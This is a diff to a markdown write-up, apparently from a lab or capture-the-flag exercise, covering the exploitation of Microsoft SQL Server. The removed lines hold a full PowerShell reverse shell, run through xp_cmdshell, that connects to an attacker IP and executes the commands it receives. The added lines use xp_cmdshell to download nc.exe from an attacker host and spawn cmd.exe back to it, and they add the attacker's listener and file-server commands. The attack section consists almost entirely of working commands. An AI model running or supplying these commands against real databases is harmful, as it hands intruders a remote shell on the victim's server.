@@ -29,25 +29,17 @@ SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
 
 ## Exploitation
-```
-
-```
-
 ```sql
-EXEC xp_cmdshell 'powershell.exe -ExecutionPolicy Bypass -Command "
-    $client = New-Object System.Net.Sockets.TCPClient(''10.10.15.73'',4444);
-    $stream = $client.GetStream();
-    $bytes = New-Object byte[] 65535;
+enable_xp_cmdshell
+xp_cmdshell "powershell -c pwd"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http:///$HOST/nc.exe -outfile nc.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe $HOST $PORT"
+```
 
-    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
-        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
-        $sendback = (iex $data 2>&1 | Out-String);
-        $sendback2 = $sendback + ''# '';
-        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2);
-        $stream.Write($sendbyte, 0, $sendbyte.Length);
-        $stream.Flush();
-    }
+```bash
+sudo python3 -m http.server 80
+```
 
-    $client.Close()
-"';
+```bash
+sudo nc -lnvp 443
 ```
